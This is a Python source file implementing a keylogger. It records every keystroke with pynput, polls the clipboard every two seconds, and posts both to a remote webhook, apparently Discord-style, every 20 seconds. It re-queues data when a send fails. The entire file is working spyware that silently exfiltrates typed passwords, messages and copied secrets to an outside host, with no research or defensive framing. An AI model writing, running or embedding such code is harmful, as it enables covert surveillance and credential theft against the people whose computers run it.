import requests
from pynput import keyboard
import threading
import pyperclip
import time

class Keylogger:
    def __init__(self, webhook):
        self.webhook = webhook
        self.log = ""
        self.last_clipboard_content = ""
        self.lock = threading.Lock()
        self.report_interval = 20  # seconds

    def callback(self, key):
        """Called for each key press."""
        with self.lock:
            try:
                self.log += key.char
            except AttributeError:
                # Handle special keys (e.g., space, enter, etc.)
                if key == keyboard.Key.space:
                    self.log += " "
                elif key == keyboard.Key.enter:
                    self.log += "[ENTER]\n"
                else:
                    self.log += f" [{key.name}] "

    def send_log(self, content_type="keylog", data=""):
        """Sends the log to the webhook."""
        if content_type == "keylog":
            with self.lock:
                if not self.log:
                    return
                log_data = self.log
                self.log = ""
            
            try:
                requests.post(self.webhook, json={"content": log_data})
            except requests.exceptions.RequestException as e:
                print(f"[!] Keylog send failed: {e}")
                # If sending fails, prepend the log back to be sent next time
                with self.lock:
                    self.log = log_data + self.log

        elif content_type == "clipboard":
            try:
                requests.post(self.webhook, json={"content": f"[CLIPBOARD]: {data}"})
            except requests.exceptions.RequestException as e:
                print(f"[!] Clipboard send failed: {e}")

    def report(self):
        """Periodically sends the collected keylogs."""
        while True:
            time.sleep(self.report_interval)
            self.send_log()

    def monitor_clipboard(self):
        """Monitors and sends clipboard content on change."""
        while True:
            try:
                current_clipboard_content = pyperclip.paste()
                if current_clipboard_content != self.last_clipboard_content:
                    if current_clipboard_content.strip():
                        if len(current_clipboard_content) > 1900:
                            current_clipboard_content = current_clipboard_content[:1900] + "..."
                        self.send_log(content_type="clipboard", data=current_clipboard_content)
                    self.last_clipboard_content = current_clipboard_content
            except Exception as e:
                # pyperclip can fail if no clipboard tool is available
                print(f"[!] Clipboard monitoring failed: {e}")
            time.sleep(2)

    def start(self):
        """Starts all monitoring threads."""
        # Start the keylog reporting thread
        report_thread = threading.Thread(target=self.report, daemon=True)
        report_thread.start()

        # Start the clipboard monitoring thread
        clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
        clipboard_thread.start()

        # Start the keyboard listener in the current thread
        with keyboard.Listener(on_press=self.callback) as listener:
            listener.join()
